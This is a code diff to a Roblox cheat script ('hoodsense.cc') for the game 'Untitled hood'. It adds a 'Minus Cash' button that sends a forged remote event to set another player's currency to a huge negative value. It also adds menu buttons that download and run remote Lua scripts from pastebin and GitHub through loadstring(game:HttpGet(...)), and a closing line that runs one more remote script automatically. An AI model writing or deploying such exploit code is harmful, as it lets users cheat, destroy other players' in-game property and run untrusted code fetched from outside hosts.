@@ -9,7 +9,9 @@ local colors = {
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("hoodsense.cc", colors)
 local Tab = Window:NewTab("Untilted hood")
+local Tab2 = Window:NewTab("Misc")
 local Section = Tab:NewSection("Cash Script")
+local Misc = Tab2:NewSection("Misc")
 
 local Workspace = game:GetService("Workspace")
 local Players = game.Players.LocalPlayer
@@ -82,8 +84,23 @@ game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
 ) 
 end)
 
-Section:NewButton("Reset Cash", "Resets Player Cash.", function()
+Section:NewButton("Minus Cash", "Minuses players cash.", function()
 
+game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
+    "Reload",
+    {
+         Name = "[Revolver]",
+        Parent = Game.Players.LocalPlayer.Backpack,
+        ClassName = "Tool",
+        Ammo = game:GetService("Players")[_G.Aiden].DataFolder.Currency,
+        MaxAmmo = {Value = -999999999999999999999999999999999999999999999999999999999999999999999999999},
+        GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
+        Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
+    }
+) 
+end)
+
+Section:NewButton("Reset Cash", "Resets Player Cash.", function()
 game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
     "Reload",
     {
@@ -219,5 +236,16 @@ game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
     }
 )
 end)
+Misc:NewButton("Rejoin", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
+end)
     
+Misc:NewButton("Fly", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/fly.lua"))()
+end)
+
+Misc:NewButton("Beamed Ware", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EliasAtto1/BeamedWare/main/BeamedWare2.0'))()
+    end)
+wait(1)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/eksogej/scripts/main/function.lua'))()
